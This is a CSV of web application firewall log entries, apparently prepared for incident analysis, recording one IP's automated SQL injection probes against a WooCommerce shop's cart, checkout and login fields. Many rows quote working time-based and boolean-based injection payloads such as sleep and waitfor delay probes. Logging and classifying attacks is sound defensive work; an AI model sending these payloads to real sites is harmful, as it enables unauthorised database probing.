timestamp_utc,txid,source_ip,host,user_agent,method,path,payload_location,parameter_or_scope,payload_family,normalised_fragment,waf_rule_ids,waf_detection,waf_action_evidence,response_status,duration_ms,signal_classification,scenario_outcome,evidence_boundary
2025-07-28T06:49:45+00:00,aIcdiR6ejpd1rzcL516mbQAAACA,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,request_body,ARGS:coupon_code,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,43.119,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:49:45+00:00,aIcdiTBI4UIHablJz4uoWwAAAAw,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_26833b49/d_e82de09d/d_f7723fdc/d_089f3389/d_93c46199,unknown,,surrounding_activity,/d_26833b49/d_e82de09d/d_f7723fdc/d_089f3389/d_93c46199,,Not observed,Not observed,301,536.662,needs_manual_review,Not applicable,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:49:46+00:00,aIcdiWBqW5QPwrZYBOdmqwAAAAc,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_26833b49/d_06c4c830/d_4a2ef8e5/d_68d41c91/d_5041223c/d_0a0fdf93/main.js,unknown,,surrounding_activity,/d_26833b49/d_06c4c830/d_4a2ef8e5/d_68d41c91/d_5041223c/d_0a0fdf93/main.js,,Not observed,Not observed,404,662.594,needs_manual_review,Not applicable,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:49:51+00:00,aIcdjxY0Y3qNGUlO9B3FXQAAAAE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,request_body,ARGS:cart[fd544202337cfd3429517881a3f1d0f4][qty],time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,45.484,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:49:51+00:00,aIcdj@cguVnAksMRQRp8HgAAAA4,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,request_body,ARGS:cart[dd342a4ac5e7d710b9da79bf1ae95b18][qty],concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,403,55.374,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:49:53+00:00,aIcdkCYgEjtTkw6sXCpdigAAABg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_address_2,other_sqli_pattern,3137 Laguna Street-1 waitfor delay '0:0:15' --,942280,Confirmed,Not observed,302,532.194,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:49:56+00:00,aIcdlF0wTc9o@PzQ-@udFgAAABI,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,argument_location_unresolved,ARGS:cart[119219d6c714c9b2dc90bc8524ca8cc0][qty],concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,403,44.895,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:06+00:00,aIcdnh6ejpd1rzcL516mdgAAACA,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_address_2,other_sqli_pattern,3137 Laguna StreetQz038Hl4'; waitfor delay '0:0:15' --,942100;942240;942280,Confirmed,Not observed,302,544.444,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:15+00:00,aIcdpnPS@9eUbbrCaap1egAAAAg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,boolean_based_sqli,-1 OR 5*5=25 --,942100,Confirmed,Not observed,403,550.538,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:15+00:00,aIcdp6KSuWe9fgehKINkFgAAAAs,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,boolean_based_sqli,-1 OR 5*5=25,942100,Confirmed,Not observed,403,531.154,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:16+00:00,aIcdp6oPCWC36y-OO0yTPgAAAA8,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,boolean_based_sqli,-1 OR 5*5=25 --,942100,Confirmed,Not observed,302,541.593,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:16+00:00,aIcdpyPen6nwyOmfeSKkEgAAAAE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,boolean_based_sqli,-1' OR 5*5=25 --,942100,Confirmed,Not observed,403,528.617,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:16+00:00,aIcdqGsAZ0gFW1@cykB4xwAAAA0,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,boolean_based_sqli,-1 OR 5*5=25,942100,Confirmed,Not observed,302,548.011,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:16+00:00,aIcdqLrOx82G34krwnfPWAAAAAQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,boolean_based_sqli,-1\x22 OR 5*5=25 --,942100,Confirmed,Not observed,403,560.386,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:17+00:00,aIcdqXdjtL3boLgTi7xUyQAAAAA,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,boolean_based_sqli,-1' OR 5*5=25 --,942100,Confirmed,Not observed,302,550.387,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:17+00:00,aIcdqa1mTwwu2DIp2smfSAAAAAU,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,boolean_based_sqli,-1' OR 5*5=25 or '9uxfYDS9'=',942100,Confirmed,Not observed,403,542.713,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:18+00:00,aIcdqaKSuWe9fgehKINkFwAAAAs,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,boolean_based_sqli,-1\x22 OR 5*5=25 --,942100,Confirmed,Not observed,302,534.131,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:18+00:00,aIcdqYICovHiF1Piw5FGywAAABE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,boolean_based_sqli,-1\x22 OR 5*5=25 or \x225aCoWoHa\x22=\x22,942100,Confirmed,Not observed,403,530.977,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:18+00:00,aIcdqqoPCWC36y-OO0yTPwAAAA8,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,boolean_based_sqli,-1' OR 5*5=25 or 'Rysz2HH7'=',942100,Confirmed,Not observed,302,548.415,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:19+00:00,aIcdqiYgEjtTkw6sXCpdnAAAABg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,boolean_based_sqli,-1\x22 OR 5*5=25 or \x22Lce4VHuq\x22=\x22,942100,Confirmed,Not observed,302,536.632,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:20+00:00,aIcdrK1mTwwu2DIp2smfSQAAAAU,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_address_2,time_based_sqli,3137 Laguna StreetaRg1MdlE' OR 235=(SELECT 235 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,302,570.984,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:21+00:00,aIcdrWsAZ0gFW1@cykB4yQAAAA0,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,argument_location_unresolved,ARGS:cart[2b0a50b2a28af2a7c38b243028badd76][qty],time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,54.724,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:27+00:00,aIcds2BqW5QPwrZYBOdmwAAAAAc,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,argument_location_unresolved,ARGS:cart[119219d6c714c9b2dc90bc8524ca8cc0][qty],concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,403,45.237,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:30+00:00,aIcdtXPS@9eUbbrCaap1fwAAAAg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,time_based_sqli,"if(now()=sysdate(),sleep(15),0)",942100;942160,Confirmed,Not observed,403,576.389,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:32+00:00,aIcdt2BqW5QPwrZYBOdmwgAAAAc,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,time_based_sqli,"if(now()=sysdate(),sleep(15),0)",942100;942160,Confirmed,Not observed,302,529.476,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:32+00:00,aIcduFn6JrXS-FyjYhouugAAABM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,argument_location_unresolved,ARGS:cart[2f24201988d6f07ef2a329f056ed877a][qty],concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,403,45.988,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:34+00:00,aIcduiPen6nwyOmfeSKkGwAAAAE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_address_2,time_based_sqli,3137 Laguna StreetZTocjFUw') OR 334=(SELECT 334 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,302,545.829,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:44+00:00,aIcdxCPen6nwyOmfeSKkHwAAAAE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,time_based_sqli,"https://df7754e.hu/sajat-fiokom/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",942100;942160,Confirmed,Not observed,403,520.797,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:46+00:00,aIcdxS03@G0SiDhSHjN4ZAAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,time_based_sqli,"/penztar/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",942100;942160,Confirmed,Not observed,302,541.136,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:47+00:00,aIcdx2BqW5QPwrZYBOdmyAAAAAc,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_26833b49/d_06c4c830/d_44b8b171/d_68d41c91/d_5041223c/d_81d50f4e/main.js,unknown,,surrounding_activity,/d_26833b49/d_06c4c830/d_44b8b171/d_68d41c91/d_5041223c/d_81d50f4e/main.js,,Not observed,Not observed,404,663.146,needs_manual_review,Not applicable,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:49+00:00,aIcdyGsAZ0gFW1@cykB40QAAAA0,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_address_2,time_based_sqli,3137 Laguna StreetKihwrriM')) OR 534=(SELECT 534 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,302,558.964,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:52+00:00,aIcdzGBqW5QPwrZYBOdmywAAAAc,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,argument_location_unresolved,ARGS:cart[646194e4e9a2aece98a4121a9254fbb3][qty],concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,403,58.355,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:50:59+00:00,aIcd04ICovHiF1Piw5FG4AAAABE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,time_based_sqli,"https://df7754e.hu/sajat-fiokom/0\x22XOR(if(now()=sysdate(),sleep(15),0))XOR\x22Z",942100;942160,Confirmed,Not observed,403,532.051,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:00+00:00,aIcd1MYunWw1mHXdRHgWzQAAABQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,time_based_sqli,"/penztar/0\x22XOR(if(now()=sysdate(),sleep(15),0))XOR\x22Z",942100;942160,Confirmed,Not observed,302,546.422,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:02+00:00,aIcd1YICovHiF1Piw5FG4QAAABE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_address_2,libinjection_only,3137 Laguna Street',942100,Confirmed,Not observed,302,538.491,needs_manual_review,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:05+00:00,aIcd2HrINe7MqO9oD0nsRwAAABo,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_address_2,concatenated_or_function_sqli,(select 198766*667891),942100;942360,Confirmed,Not observed,302,563.835,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:05+00:00,aIcd2S03@G0SiDhSHjN4egAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_address_2,concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,403,39.150,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:14+00:00,aIcd4kCzsBQr3Sf89QvnAgAAAAw,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,31.210,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:16+00:00,aIcd5BTJBT7ceRXAEJsbeAAAAAQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,39.954,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:29+00:00,aIcd8MYunWw1mHXdRHgW6gAAABQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_26833b49/d_06c4c830/d_c4db7a98/d_68d41c91/d_5041223c/d_ce2e57de/d_3e5ba059,unknown,,surrounding_activity,/d_26833b49/d_06c4c830/d_c4db7a98/d_68d41c91/d_5041223c/d_ce2e57de/d_3e5ba059,,Not observed,Not observed,301,550.299,needs_manual_review,Not applicable,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:30+00:00,aIcd8oWvb30@7x2P2VQZPwAAAAI,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,other_sqli_pattern,https://df7754e.hu/sajat-fiokom/-1 waitfor delay '0:0:15' --,942280,Confirmed,Not observed,403,555.493,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:32+00:00,aIcd88jQW5ASckD8shjSxgAAABY,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:_wp_http_referer,other_sqli_pattern,/penztar/-1 waitfor delay '0:0:15' --,942280,Confirmed,Not observed,302,580.048,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:37+00:00,aIcd@Ci@0YBd7n3GzMhBHAAAABs,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_city,boolean_based_sqli,-1 OR 5*5=25 --,942100,Confirmed,Not observed,302,563.149,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T06:51:37+00:00,aIcd@epLUNOKrQxB9TdsTQAAABI,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:shipping_city,boolean_based_sqli,-1 OR 5*5=25,942100,Confirmed,Not observed,302,549.185,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
